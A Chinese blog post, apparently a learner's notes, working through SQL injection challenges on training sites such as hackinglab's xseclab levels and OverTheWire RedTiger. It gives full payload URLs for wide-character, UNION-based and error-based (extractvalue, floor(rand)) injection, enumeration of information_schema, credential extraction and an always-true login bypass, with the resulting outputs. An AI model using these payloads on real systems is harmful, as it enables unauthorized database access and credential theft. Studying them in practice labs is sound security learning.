---
title: sql注入入门
date: 2017-08-06 10:08:25
tags:
- sql注入
- web安全
category:
- web安全
- sql
- sql注入
---

本篇记录了尝试从零基础入门SQL注入，包括简单的注入、宽字符注入、利用报错信息注入...

<!-- more -->


# 练习网站

[网络信息安全攻防学习平台](http://hackinglab.cn/index.php)

mysql中select的格式：
```
SELECT
    [ALL | DISTINCT | DISTINCTROW ]
      [HIGH_PRIORITY]
      [STRAIGHT_JOIN]
      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]
      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]
    select_expr [, select_expr ...]
    [FROM table_references
    [WHERE where_condition]
    [GROUP BY {col_name | expr | position}
      [ASC | DESC], ... [WITH ROLLUP]]
    [HAVING where_condition]
    [ORDER BY {col_name | expr | position}
      [ASC | DESC], ...]
    [LIMIT {[offset,] row_count | row_count OFFSET offset}]
    [PROCEDURE procedure_name(argument_list)]
    [INTO OUTFILE 'file_name' export_options
      | INTO DUMPFILE 'file_name'
      | INTO var_name [, var_name]]
    [FOR UPDATE | LOCK IN SHARE MODE]]
```


## 防注入

	利用宽字符将`'`注入

	猜测闭合字符：

		输入 `'`，报错；而输入`'#`未报错。
	判断列 order by 4

	判断显示位
	union all select 1,2,3,4


	查询语句
	union all select 1,user(),3,4  用户
	database()数据库
	version()版本


可以利用python的包来作相关处理，比如：
查看特殊字符url转义。
```
In [30]: import urllib
In [30]: urllib.quote('\'')
Out[30]: '%27'
In [31]: urllib.unquote('%23')
Out[31]: '#'
```

转换字符串为二进制并用十六进制表示
```
In [33]: import binascii

In [34]: binascii.hexlify('mydbs')
Out[34]: '6d79646273'
```

查数据库表
```
http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1%df%27%20union%20select%201,concat(group_concat(distinct+table_name)),3%20%20from%20information_schema.tables%20where%20table_schema=0x6d79646273%23
```

	sae_user_sqli4

查表中对应的字段
```
http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1%df%27%20union%20select%201,concat(group_concat(distinct+column_name)),3%20%20from%20information_schema.columns%20where%20table_name=0x7361655f757365725f73716c6934%23
```

	id,title_1,content_1

## 到底能不能回显

关于`limit`命令的注入。

得到数据库名称：
```
procedure analyse(extractvalue(rand(), concat(0x3a,(select group_concat(0x7e, schema_name ,0x7e) from information_schema.schemata))),1)%23&num=1
```

	XPATH syntax error: ':~information_schema~,~mydbs~,~t' 

`mydbs` 0x6d79646273

procedure analyse(extractvalue(rand(), concat(0x3a,(select group_concat(0x7e, table_name,0x7e) from information_schema.tables where table_schema=0x6d79646273 ))),1)%23&num=1

	XPATH syntax error: ':~article~,~user~' 

得到table name:

```
procedure analyse(extractvalue(rand(), concat(0x3a,(select group_concat(0x7e, table_name,0x7e) from information_schema.tables where table_schema=database() limit 1,1))),1)%23&num=1
```

`user`二级制`0x75736572`

由于`group_concat`得出的结果有长度限制，只能limit一个字段一个字段泄露。
```
procedure analyse(extractvalue(rand(), concat(0x3a,(select concat(0x7e, column_name, 0x7e) from information_schema.columns where table_name=0x75736572 limit 2,1))),1)%23&num=1
```

	四个字段 id,username,password,lastloginIP

获取各个字段
```
procedure analyse(extractvalue(rand(), concat(0x3a,(select concat(0x7e,username,0x3a, password, 0x7e) from user limit 2,1))),1)%23&num=1
```

	XPATH syntax error: ':~flag:myflagishere~'

## 邂逅

从图片请求入手，不能在浏览器通过正常请求测试是否有注入点，应当在BurpSuite中操作。

```
/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%bf%27
```

```
# 判断列，直到5报错
/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%bf%27%20order%20by%205%23
# 判断显示位, 回显3
/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%bf%27%20union%20select%201,2,3,4%20%23
# 获取当前数据库的表名article,pic 
/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%bf%27%20union%20select%201,2,concat(group_concat(distinct+table_name)),4%20%20from%20information_schema.tables%20where%20table_schema=database()%23
# 查找article的字段，'article'=>0x61727469636c65
## 得到 id,title,content,others 
/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%bf%27%20union%20select%201,2,concat(group_concat(column_name)),4%20%20from%20information_schema.columns%20where%20table_name=0x61727469636c65%23
## 得到数据
/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%bf%27%20union%20select%201,2,concat(group_concat(title,content),0x3a),4%20%20from%20article%23
未得到有用信息

# 查找pic的字段，'pic'=>0x706963
## 得到 id,picname,data,text 
/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%bf%27%20union%20select%201,2,concat(group_concat(column_name)),4%20%20from%20information_schema.columns%20where%20table_name=0x706963%23
## 得到数据
/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%bf%27%20union%20select%201,2,concat(group_concat(picname,0x7e),0x3a),4%20%20from%20pic%23
得到 dog1.jpg~,cat1.jpg~,flagishere_askldjfklasjdfl.jpg~:

```
在浏览器访问flagishere_askldjfklasjdfl.jpg即可得到flag。


## ErrorBased 

- 猜测闭合字符
- 猜测列数
- 尝试得到显示位
- 得到数据库

题目是基于错误的，用到的报错语句为：
```
select count(*),concat(0x3a,0x3a,(注入代码),0x3a,0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a
如
select concat(0x3a,0x3a,(version()),0x3a,0x3a,floor(2*rand(0)))a,count(*) FROM information_schema.tables GROUP BY a

select count(*),concat(0x3a,0x3a,(database()),0x3a,0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a
#可通过urllib.quote()将其转换成url参数输入
#得到Duplicate entry '::mydbs::1' for key 'group_key'


```
接下来爆表，替换注入代码即可：
```
UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database(); 
UNION SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database() LIMIT 0,1;
```

	select count(*),concat(0x3a,0x3a,(SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database() limit 0,1),0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a

当前数据库的表依次为：`log`,`motto`,`user`

爆字段：
```
SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'tablename'
SELECT column_name FROM information_schema.columns WHERE table_name = 'tablename' limit 0,1
```

	select count(*),concat(0x3a,0x3a,(SELECT column_name FROM information_schema.columns WHERE table_name = 'motto' limit 0,1),0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a
依次得到：`id`,`username`,`motto`,

爆数据：


	select count(*),concat(0x3a,0x3a,(SELECT username FROM motto limit 0,1),0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a

怎么会没有返回结果！无语了！

换一个，接着研究。
```
http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' and extractvalue(1, concat(0x3a,(SELECT distinct concat(0x3a,username,0x3a,motto,0x3a,0x3a) FROM motto limit 3,1)))%23
```
得到返回结果：

	'::#adf#ad@@#:key#notfound!#::' 

## 7题

//看数据库版本 5.1.73
```
http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
```
//看当前用户 saeuser@220.181.129.121
```
http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
```
//当前数据库 mydbs
```
http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
```
//爆库 information_schema, mydbs, test
```
http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
```
//爆表 log, motto, user
```
http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1) ) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 1,1) ) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
```
//爆字段 id, username, password
```
http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x75736572 LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23

http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x75736572 LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
```
//读内容
```
http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' and extractvalue(1, concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM user limit 0,1)))%23
```
//发现user表没有flag，读motto表
key#notfound!#




# [RegTiger](http://redtiger.labs.overthewire.org)

## level1

点击Category：1后，网址以GET方式传递`cat`参数。
### 利用`and 1=1`,`and 1=2`进行判断是否存在注入点：
```
# 正常 
https://redtiger.labs.overthewire.org/level1.php?cat=1 and 1=1 
# 运行异常
https://redtiger.labs.overthewire.org/level1.php?cat=1 and 1=2 
```
### 存在数字型注入，利用order by 测试出存在4个列： 
```
# 正常 
https://redtiger.labs.overthewire.org/level1.php?cat=1 order by 4 
# 运行异常
https://redtiger.labs.overthewire.org/level1.php?cat=1 order by 5 
```

### 构造union联合查询语句，找回显： 
```
https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,3,4 
```
发现3,4 处存在回显。

我这里继续爆库、爆表、爆字段等操作，发现异常。
```
https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,version(), database()
```
回显

		5.5.57-0+deb8u1
		hackit
```
https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()
https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name='level1_users'
```
回显

		Some things are disabled!!!

所以无法找出`level1_users`的字段了吗？
当然不是，点击登录按钮，在浏览器调试窗口（火狐的firebug或者F12）仔细看发送请求包，可知数据是POST发送的，字段为
	
	查询字符串
		cat:1
	表单数据
		user:
		password:
		login:login

开始试了试
```
https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,user,password from level1_users
```
结果不对，而我观察到页面中给出的是`username`，所以换成它。
```
https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,username,password from level1_us

```
got it.拿到用户名密码后登录即可。

## level2

绕过的sql万能密码：
```
' or '1'='1
```

## 参考网站
[1] [SQL 注入](https://ctf-wiki.github.io/ctf-wiki/web/sqli/)
[2] [SQL注入教程——（三）简单的注入尝试](http://blog.csdn.net/helloc0de/article/details/76142478)